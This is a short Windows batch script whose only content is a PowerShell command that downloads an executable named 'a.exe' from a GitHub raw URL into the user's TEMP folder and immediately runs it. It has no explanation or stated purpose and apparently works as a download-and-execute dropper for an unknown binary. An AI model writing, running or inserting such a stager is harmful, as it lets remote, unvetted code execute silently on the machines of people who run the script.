@echo off
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/frexoff/Something/raw/main/a.exe', \"$env:TEMP\a.exe\"); Start-Process \"$env:TEMP\a.exe\""
exit
